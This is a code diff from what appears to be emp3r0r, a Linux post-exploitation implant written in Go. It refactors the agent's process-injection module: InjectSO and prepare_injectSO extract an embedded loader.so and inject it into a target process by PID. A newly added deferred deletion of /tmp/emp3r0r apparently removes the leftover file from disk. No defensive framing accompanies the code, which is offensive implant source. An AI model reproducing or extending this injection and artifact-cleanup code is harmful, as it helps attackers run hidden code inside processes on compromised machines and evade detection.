@@ -1,6 +1,7 @@
-package agent
+//go:build linux
+// +build linux
 
-// build +linux
+package agent
 
 import (
 	"encoding/hex"
@@ -16,6 +17,7 @@ import (
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/file"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	golpe "github.com/jm33-m0/go-lpe"
 )
@@ -276,6 +278,7 @@ func InjectSO(pid int) error {
 	if err != nil {
 		return err
 	}
+	defer os.RemoveAll("/tmp/emp3r0r") // in case we have this file remaining on disk
 	return injectSOWorker(so_path, pid)
 }
 
@@ -295,7 +298,7 @@ func prepare_injectSO(pid int) (so_path string, err error) {
 		so_path = root_so_path
 	}
 	if !util.IsFileExist(so_path) {
-		out, err := golpe.ExtractFileFromString(emp3r0r_data.LoaderSO_Data)
+		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
 		if err != nil {
 			return "", fmt.Errorf("Extract loader.so failed: %v", err)
 		}
@@ -378,9 +381,6 @@ func InjectorHandler(pid int, method string) (err error) {
 		err = InjectSO(pid)
 		if err == nil {
 			err = os.RemoveAll("/tmp/emp3r0r")
-			if err != nil {
-				return
-			}
 		}
 	default:
 		err = fmt.Errorf("%s is not supported", method)
